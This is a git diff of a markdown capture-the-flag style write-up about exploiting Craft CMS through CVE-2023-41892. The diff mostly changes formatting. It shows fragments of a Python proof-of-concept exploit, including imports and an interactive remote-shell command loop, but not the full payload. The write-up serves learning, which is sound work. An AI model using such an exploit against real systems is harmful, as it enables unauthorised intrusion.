@@ -31,7 +31,8 @@ We can see there’s a web services running in 80 port and ssh service in 22
 <br/><br/>
 - There is a web service powered by Craft CMS in the main page. CVE-2023-41892 is a vulnerability for this technology, we need to execute a POC for this vulnerability, but after a lot of time fixing parameters made by machine configurations we find the right version of the exploit.
 <br/><br/>
-```bash
+
+```python
 import requests
 import re
 import sys
@@ -120,9 +121,8 @@ if __name__ == "__main__":
             cmd = input("$ ")
             shell(cmd)
 ```
-<br/><br/>
-- 
 
+<br/><br/>
 ![Untitled]({{ '/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_2.png' | relative_url }})
 <br/><br/>
 - Make a little bit more stable the bash
